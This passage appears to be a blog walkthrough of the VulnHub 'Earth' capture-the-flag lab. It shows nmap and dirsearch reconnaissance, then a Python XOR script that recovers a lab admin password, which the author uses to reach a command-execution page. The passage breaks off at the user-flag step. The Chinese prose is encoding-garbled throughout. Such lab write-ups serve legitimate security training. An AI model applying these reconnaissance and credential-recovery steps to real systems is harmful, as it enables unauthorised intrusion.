class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426120844444.png" alt="image-20250426120844444"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kaliçš„IPï¼š</span><br>192.168.1.103<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨nmapå·¥å…·æ‰«æ"><a href="#ä½¿ç”¨nmapå·¥å…·æ‰«æ" class="headerlink" title="ä½¿ç”¨nmapå·¥å…·æ‰«æ"></a>ä½¿ç”¨<code>nmap</code>å·¥å…·æ‰«æ</h4><p>æœ€å¥½åœ¨æ‰“å¼€é¶æœºä¹‹å‰æ‰«æä¸€æ¬¡ï¼Œåœ¨æ‰“å¼€é¶æœºä¹‹åæ‰«æä¸€æ¬¡ï¼Œè¿™æ ·å®¹æ˜“å¯¹æ¯”å‡ºå“ªä¸€ä¸ªæ˜¯é¶æœº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap 192.168.1.0/24<br></code></pre></td></tr></table></figure><p>æ‰“å¼€é¶æœºå‰æ‰«æç»“æœ</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426121849445.png" alt="image-20250426121849445"></p><p>æ‰“å¼€é¶æœºåæ‰«æç»“æœ</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426122105966.png" alt="image-20250426122105966"></p><p>å¯ä»¥å‘ç°å¤šå‡ºäº†102ï¼Œè¿™ä¸ªå°±æ˜¯é¶æœºçš„IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># é¶æœºçš„IP</span><br>192.168.1.102<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kaliçš„IPï¼š</span><br>192.168.1.103<br><span class="hljs-comment"># é¶æœºçš„IP</span><br>192.168.1.102<br></code></pre></td></tr></table></figure><h3 id="æ·±å…¥æ¢æµ‹"><a href="#æ·±å…¥æ¢æµ‹" class="headerlink" title="æ·±å…¥æ¢æµ‹"></a>æ·±å…¥æ¢æµ‹</h3><p>ä½¿ç”¨<code>nmap</code>è¿›è¡Œæ·±å…¥æ¢æµ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426122805931.png" alt="image-20250426122805931"></p><p>å¼€æ”¾äº†<code>22</code>ã€<code>80</code>ã€<code>443</code>ä¸‰ä¸ªç«¯å£ï¼Œå¹¶ä¸”<code>80</code>å’Œ<code>443</code>éƒ½æ˜¯python3.9ï¼Œè¿˜åœ¨<code>443</code>ç«¯å£å‘ç°å­˜åœ¨DNSè§£æ</p><h1 id="HTTPSæ¢æµ‹"><a href="#HTTPSæ¢æµ‹" class="headerlink" title="HTTPSæ¢æµ‹"></a>HTTPSæ¢æµ‹</h1><p>æœ‰DNSè§£æï¼Œéœ€è¦æ‰‹åŠ¨ä¿®æ”¹<code>/etc/hosts</code>ï¼Œæ·»åŠ DNSè§£æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Windowsæ–‡ä»¶è·¯å¾„</span><br>C:\Windows\System32\dirvers\etc\hosts<br><span class="hljs-comment"># Linuxæ–‡ä»¶è·¯å¾„</span><br>/etc/hosts<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426123657419.png" alt="image-20250426123657419"></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426123731272.png" alt="image-20250426123731272"></p><p>ç„¶åå°±å¯ä»¥è®¿é—®ç½‘ç«™äº†ï¼Œç¬¬ä¸€ä¸ªç½‘ç«™</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//earth.local/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426124114446.png" alt="image-20250426124114446"></p><p>ä¸‹é¢æœ‰<code>Previous Messages</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">37090</span>b<span class="hljs-number">59030</span>f<span class="hljs-number">11060</span>b<span class="hljs-number">0</span>a<span class="hljs-number">1</span>b<span class="hljs-number">4e0000000000004312170</span>a<span class="hljs-number">1</span>b<span class="hljs-number">0</span>b<span class="hljs-number">0e4107174</span>f<span class="hljs-number">1</span>a<span class="hljs-number">0</span>b<span class="hljs-number">044e0</span>a<span class="hljs-number">000202134e0</span>a<span class="hljs-number">161</span>d<span class="hljs-number">17040359061</span>d<span class="hljs-number">43370</span>f<span class="hljs-number">15030</span>b<span class="hljs-number">10414e340</span>e<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>a<span class="hljs-number">0</span>f<span class="hljs-number">0</span>b<span class="hljs-number">0</span>b<span class="hljs-number">061</span>d<span class="hljs-number">430e0059220</span>f<span class="hljs-number">11124059261</span>ae<span class="hljs-number">281</span>ba<span class="hljs-number">124e14001</span><span class="hljs-keyword">c</span><span class="hljs-number">06411</span>a<span class="hljs-number">110e00435542495</span>f<span class="hljs-number">5e430</span>a<span class="hljs-number">0715000306150</span>b<span class="hljs-number">0</span>b<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">4e4</span>b<span class="hljs-number">5242495</span>f<span class="hljs-number">5e430</span><span class="hljs-keyword">c</span><span class="hljs-number">07150</span>a<span class="hljs-number">1</span>d<span class="hljs-number">4</span>a<span class="hljs-number">410216010943e281</span>b<span class="hljs-number">54e1</span><span class="hljs-keyword">c</span><span class="hljs-number">0101160606591</span>b<span class="hljs-number">0143121</span>a<span class="hljs-number">0</span>b<span class="hljs-number">0</span>a<span class="hljs-number">1</span>a<span class="hljs-number">00094e1</span>f<span class="hljs-number">1</span>d<span class="hljs-number">010e412</span>d<span class="hljs-number">180307050e1</span><span class="hljs-keyword">c</span><span class="hljs-number">17060</span>f<span class="hljs-number">43150159210</span>b<span class="hljs-number">144137161</span>d<span class="hljs-number">054</span>d<span class="hljs-number">41270</span>d<span class="hljs-number">4</span>f<span class="hljs-number">0710410010010</span>b<span class="hljs-number">431507140</span>a<span class="hljs-number">1</span>d<span class="hljs-number">43001</span>d<span class="hljs-number">5903010</span>d<span class="hljs-number">064e18010</span>a<span class="hljs-number">4307010</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">4e1708031</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">4e02124</span>e<span class="hljs-number">1</span>d<span class="hljs-number">0</span>a<span class="hljs-number">0</span>b<span class="hljs-number">13410</span>f<span class="hljs-number">0</span>a<span class="hljs-number">4</span>f<span class="hljs-number">2</span>b<span class="hljs-number">02131</span>a<span class="hljs-number">11e281</span>b<span class="hljs-number">61</span>d<span class="hljs-number">43261</span><span class="hljs-keyword">c</span><span class="hljs-number">18010</span>a<span class="hljs-number">43220</span>f<span class="hljs-number">1716010</span>d<span class="hljs-number">40</span><br> <br><span class="hljs-number">3714171e0</span>b<span class="hljs-number">0</span>a<span class="hljs-number">550</span>a<span class="hljs-number">1859101</span>d<span class="hljs-number">064</span>b<span class="hljs-number">160</span>a<span class="hljs-number">191</span>a<span class="hljs-number">4</span>b<span class="hljs-number">0908140</span>d<span class="hljs-number">0e0</span>d<span class="hljs-number">441</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>d<span class="hljs-number">4</span>b<span class="hljs-number">1611074318160814114</span>b<span class="hljs-number">0</span>a<span class="hljs-number">1</span>d<span class="hljs-number">06170e1444010</span>b<span class="hljs-number">0</span>a<span class="hljs-number">0</span>d<span class="hljs-number">441</span><span class="hljs-keyword">c</span><span class="hljs-number">104</span>b<span class="hljs-number">150106104</span>b<span class="hljs-number">1</span>d<span class="hljs-number">011</span>b<span class="hljs-number">100e59101</span>d<span class="hljs-number">0205591314170e0</span>b<span class="hljs-number">4</span>a<span class="hljs-number">552</span>a<span class="hljs-number">1</span>f<span class="hljs-number">59071</span>a<span class="hljs-number">16071</span>d<span class="hljs-number">44130</span>f<span class="hljs-number">041810550</span>a<span class="hljs-number">05590555010</span>a<span class="hljs-number">0</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">011609590</span>d<span class="hljs-number">13430</span>a<span class="hljs-number">171</span>d<span class="hljs-number">170</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>f<span class="hljs-number">0044160</span><span class="hljs-keyword">c</span><span class="hljs-number">1e150055011</span>e<span class="hljs-number">100811430</span>a<span class="hljs-number">59061417030</span>d<span class="hljs-number">1117430910035506051611120</span>b<span class="hljs-number">45</span><br> <br><span class="hljs-number">2402111</span>b<span class="hljs-number">1</span>a<span class="hljs-number">0705070</span>a<span class="hljs-number">41000</span>a<span class="hljs-number">431</span>a<span class="hljs-number">000</span>a<span class="hljs-number">0e0</span>a<span class="hljs-number">0</span>f<span class="hljs-number">04104601164</span>d<span class="hljs-number">050</span>f<span class="hljs-number">070</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>f<span class="hljs-number">15540</span>d<span class="hljs-number">1018000000000</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">06410</span>f<span class="hljs-number">0901420e105</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>d<span class="hljs-number">074</span>d<span class="hljs-number">04181</span>a<span class="hljs-number">01041</span><span class="hljs-keyword">c</span><span class="hljs-number">170</span>d<span class="hljs-number">4</span>f<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">13000</span>d<span class="hljs-number">430e0</span>e<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>a<span class="hljs-number">0006410</span>b<span class="hljs-number">420</span>d<span class="hljs-number">074</span>d<span class="hljs-number">55404645031</span>b<span class="hljs-number">18040</span>a<span class="hljs-number">03074</span>d<span class="hljs-number">181104111</span>b<span class="hljs-number">410</span>f<span class="hljs-number">000</span>a<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">41335</span>d<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">040</span>f<span class="hljs-number">4e070</span>d<span class="hljs-number">04521201111</span>f<span class="hljs-number">1</span>d<span class="hljs-number">4</span>d<span class="hljs-number">031</span>d<span class="hljs-number">090</span>f<span class="hljs-number">010e00471</span><span class="hljs-keyword">c</span><span class="hljs-number">07001647481</span>a<span class="hljs-number">0</span>b<span class="hljs-number">412</span>b<span class="hljs-number">1217151</span>a<span class="hljs-number">531</span>b<span class="hljs-number">4304001e151</span>b<span class="hljs-number">171</span>a<span class="hljs-number">4441020e030741054418100</span><span class="hljs-keyword">c</span><span class="hljs-number">130</span>b<span class="hljs-number">1745081</span><span class="hljs-keyword">c</span><span class="hljs-number">541</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>b<span class="hljs-number">0949020211040</span>d<span class="hljs-number">1</span>b<span class="hljs-number">410</span>f<span class="hljs-number">090142030153091</span>b<span class="hljs-number">4</span>d<span class="hljs-number">150153040714110</span>b<span class="hljs-number">174</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">13000</span>d<span class="hljs-number">441</span>b<span class="hljs-number">410</span>f<span class="hljs-number">13080</span>d<span class="hljs-number">12145</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>d<span class="hljs-number">0708410</span>f<span class="hljs-number">1</span>d<span class="hljs-number">014101011</span>a<span class="hljs-number">050</span>d<span class="hljs-number">0</span>a<span class="hljs-number">084</span>d<span class="hljs-number">540906090507090242150</span>b<span class="hljs-number">141</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">08411e010</span>a<span class="hljs-number">0</span>d<span class="hljs-number">1</span>b<span class="hljs-number">120</span>d<span class="hljs-number">110</span>d<span class="hljs-number">1</span>d<span class="hljs-number">040e1</span>a<span class="hljs-number">450</span><span class="hljs-keyword">c</span><span class="hljs-number">0e410</span>f<span class="hljs-number">090407130</span>b<span class="hljs-number">5601164</span>d<span class="hljs-number">00001749411e151</span><span class="hljs-keyword">c</span><span class="hljs-number">061e454</span>d<span class="hljs-number">0011170</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>a<span class="hljs-number">080</span>d<span class="hljs-number">470</span>a<span class="hljs-number">1006055</span>a<span class="hljs-number">010600124053360e1</span>f<span class="hljs-number">1148040906010e130</span><span class="hljs-keyword">c</span><span class="hljs-number">00090</span>d<span class="hljs-number">4e02130</span>b<span class="hljs-number">05015</span>a<span class="hljs-number">0</span>b<span class="hljs-number">104</span>d<span class="hljs-number">0800170</span><span class="hljs-keyword">c</span><span class="hljs-number">0213000</span>d<span class="hljs-number">104</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">050000450</span>f<span class="hljs-number">01070</span>b<span class="hljs-number">47080318445</span><span class="hljs-keyword">c</span><span class="hljs-number">090308410</span>f<span class="hljs-number">010</span><span class="hljs-keyword">c</span><span class="hljs-number">12171</span>a<span class="hljs-number">48021</span>f<span class="hljs-number">49080006091</span>a<span class="hljs-number">48001</span>d<span class="hljs-number">47514</span><span class="hljs-keyword">c</span><span class="hljs-number">50445601190108011</span>d<span class="hljs-number">451817151</span>a<span class="hljs-number">104</span><span class="hljs-keyword">c</span><span class="hljs-number">080</span>a<span class="hljs-number">0e5</span>a<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªç½‘ç«™</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//terratest.earth.local/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426125647730.png" alt="image-20250426125647730"></p><h3 id="æ‰«æç›®å½•"><a href="#æ‰«æç›®å½•" class="headerlink" title="æ‰«æç›®å½•"></a>æ‰«æç›®å½•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u https://earth.local/ -e *<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426125758144.png" alt="image-20250426125758144"></p><p>æ‰«å‡ºäº†<code>/admin</code>ç›®å½•ï¼Œå†æ‰«ä¸€ä¸‹å¦ä¸€ä¸ª</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u https://terratest.earth.local/ -e *<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426125532468.png" alt="image-20250426125532468"></p><p>æ‰«å‡º<code>robots.txt</code></p><p>æŒ¨ä¸ªè®¿é—®çœ‹çœ‹</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//earth.local/admin</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426125937051.png" alt="image-20250426125937051"></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426125946263.png" alt="image-20250426125946263"></p><p>éœ€è¦ç”¨æˆ·åå’Œå¯†ç ç™»å½•ï¼Œå†çœ‹çœ‹å¦ä¸€ä¸ªç½‘ç«™</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//terratest.earth.local/robots.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426130127054.png" alt="image-20250426130127054"></p><p>å‘ç°ä¸€ä¸ª<code>testingnotes</code>æ–‡ä»¶ï¼Œä½†ä¸ç¡®å®šæ ¼å¼ï¼Œå¯ä»¥å°è¯•å‡ºæ˜¯<code>.txt</code>æ–‡ä»¶</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//terratest.earth.local/testingnotes.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426130235265.png" alt="image-20250426130235265"></p><p>ç”¨AIç¿»è¯‘è¿‡æ¥æ˜¯</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">å®‰å…¨æ¶ˆæ¯ç³»ç»Ÿæµ‹è¯•ç¬”è®°ï¼š<br>ä½¿ç”¨å¼‚æˆ–åŠ å¯†ç®—æ³•ï¼Œé‰´äºå…¶åœ¨ RSA ä¸­çš„åº”ç”¨ï¼Œè¯¥ç®—æ³•åº”æ˜¯å®‰å…¨çš„ã€‚<br>åœ°çƒæ–¹é¢å·²ç¡®è®¤æ”¶åˆ°æˆ‘ä»¬å‘é€çš„æ¶ˆæ¯ã€‚<br>ä½¿ç”¨ testdata<span class="hljs-selector-class">.txt</span> å¯¹åŠ å¯†åŠŸèƒ½è¿›è¡Œäº†æµ‹è¯•ã€‚<br>â€œterraâ€ è¢«ç”¨ä½œç®¡ç†é—¨æˆ·çš„ç”¨æˆ·åã€‚<br>å¾…åŠäº‹é¡¹ï¼š<br>æˆ‘ä»¬è¯¥å¦‚ä½•å®‰å…¨åœ°å‘åœ°çƒå‘é€æ¯æœˆå¯†é’¥ï¼Ÿè¿˜æ˜¯è¯´æˆ‘ä»¬åº”è¯¥æ¯å‘¨æ›´æ¢å¯†é’¥ï¼Ÿ<br>éœ€è¦æµ‹è¯•ä¸åŒçš„å¯†é’¥é•¿åº¦ä»¥æŠµå¾¡æš´åŠ›ç ´è§£ã€‚å¯†é’¥å¤šé•¿åˆé€‚å‘¢ï¼Ÿ<br>éœ€è¦æ”¹è¿›æ¶ˆæ¯ä¼ é€’ç•Œé¢å’Œç®¡ç†é¢æ¿çš„ç•Œé¢ï¼Œç›®å‰å®ƒä»¬è¿‡äºç®€é™‹ã€‚<br></code></pre></td></tr></table></figure><p>å¯çŸ¥ä½¿ç”¨çš„æ˜¯å¼‚æˆ–åŠ å¯†ç®—æ³•ï¼Œå¹¶ä¸”å¯¹<code>testdata.txt</code>å¯¹è¿›è¡Œäº†åŠ å¯†æµ‹è¯•ï¼Œç”¨æˆ·åæ˜¯<code>terra</code>ï¼Œè®¿é—®<code>testdata.txt</code>çœ‹çœ‹</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//terratest.earth.local/testdata.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426130615160.png" alt="image-20250426130615160"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">According <span class="hljs-keyword">to</span> radiometric dating estimation <span class="hljs-keyword">and</span> other evidence, Earth formed <span class="hljs-keyword">over</span> <span class="hljs-number">4.5</span> billion years ago. <span class="hljs-keyword">Within</span> the first billion years <span class="hljs-keyword">of</span> Earth<span class="hljs-string">&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;</span>s atmosphere <span class="hljs-keyword">and</span> surface, <span class="hljs-keyword">leading</span> <span class="hljs-keyword">to</span> the proliferation <span class="hljs-keyword">of</span> anaerobic <span class="hljs-keyword">and</span>, later, aerobic organisms. <span class="hljs-keyword">Some</span> geological evidence indicates that life may have arisen <span class="hljs-keyword">as</span> early <span class="hljs-keyword">as</span> <span class="hljs-number">4.1</span> billion years ago.<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">æ ¹æ®æ”¾å°„æ€§æµ‹å¹´ä¼°ç®—åŠå…¶ä»–è¯æ®ï¼Œåœ°çƒå½¢æˆäº<span class="hljs-number"> 45 </span>äº¿å¤šå¹´å‰ã€‚åœ¨åœ°çƒå†å²çš„æœ€åˆ<span class="hljs-number"> 10 </span>äº¿å¹´é‡Œï¼Œç”Ÿå‘½åœ¨æµ·æ´‹ä¸­å‡ºç°ï¼Œå¹¶å¼€å§‹å½±å“åœ°çƒçš„å¤§æ°”å’Œåœ°è¡¨ï¼Œå¯¼è‡´åŒæ°§ç”Ÿç‰©ç¹è¡ï¼Œéšåå¥½æ°§ç”Ÿç‰©ä¹Ÿå¼€å§‹å‡ºç°ã€‚ä¸€äº›åœ°è´¨è¯æ®è¡¨æ˜ï¼Œç”Ÿå‘½æœ€æ—©å¯èƒ½åœ¨<span class="hljs-number"> 41 </span>äº¿å¹´å‰å°±å·²å‡ºç°ã€‚<br></code></pre></td></tr></table></figure><h3 id="è§£å¯†å¯†ç "><a href="#è§£å¯†å¯†ç " class="headerlink" title="è§£å¯†å¯†ç "></a>è§£å¯†å¯†ç </h3><p>æ ¹æ®ä¹‹å‰ç¬¬ä¸€ä¸ªç½‘ç«™å¾—åˆ°ä¿¡æ¯è¿›è¡ŒXORè§£å¯†ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-comment"># ç»™å®šçš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span><br>c = <span class="hljs-string">&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span><br><br><span class="hljs-comment"># ç»™å®šçš„æ˜æ–‡å­—ç¬¦ä¸²</span><br>m = <span class="hljs-string">&quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;</span><br><br><span class="hljs-comment"># å°†æ˜æ–‡å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤º</span><br>m_hex = binascii.hexlify(m.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><span class="hljs-comment"># ç¡®ä¿ä¸¤ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²é•¿åº¦ä¸€è‡´</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(c) != <span class="hljs-built_in">len</span>(m_hex):<br>    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;The length of c and m_hex must be the same.&quot;</span>)<br><br><span class="hljs-comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ï¼Œè¿›è¡Œå¼‚æˆ–æ“ä½œ</span><br>result_hex = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(c, <span class="hljs-number">16</span>) ^ <span class="hljs-built_in">int</span>(m_hex, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:]  <span class="hljs-comment"># å»æ‰å‰ç¼€ &quot;0x&quot;</span><br><br><span class="hljs-comment"># ç¡®ä¿ç»“æœçš„é•¿åº¦ä¸åŸå§‹å­—ç¬¦ä¸²ä¸€è‡´</span><br>result_hex = result_hex.zfill(<span class="hljs-built_in">len</span>(c))<br><br><span class="hljs-comment"># å°†å¼‚æˆ–åçš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢å›å­—èŠ‚</span><br>result_bytes = binascii.unhexlify(result_hex)<br><br><span class="hljs-comment"># å°†å­—èŠ‚è§£ç ä¸ºå­—ç¬¦ä¸²</span><br>result_str = result_bytes.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><span class="hljs-built_in">print</span>(result_str)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ç»“æœ</span><br>earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat<br></code></pre></td></tr></table></figure><p>å‘ç°æ˜¯é‡å¤çš„<code>earthclimatechangebad4humans</code>ï¼Œè¿™å°±æ˜¯å¯†ç ï¼Œå»ç™»å½•</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">ç”¨æˆ·åï¼šterra<br>å¯†ç ï¼šearthclimatechangebad4humans<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426131843279.png" alt="image-20250426131843279"></p><p>æˆåŠŸç™»å½•ï¼Œæ¥åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œé¡µé¢</p><h3 id="æŸ¥æ‰¾flag"><a href="#æŸ¥æ‰¾flag" class="headerlink" title="æŸ¥æ‰¾flag"></a>æŸ¥æ‰¾flag</h3><h4 id="user-flag"><a href="#user-flag" class="headerlink" title="user_flag"></a><code>user_flag</code></h4><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426132012976.png" 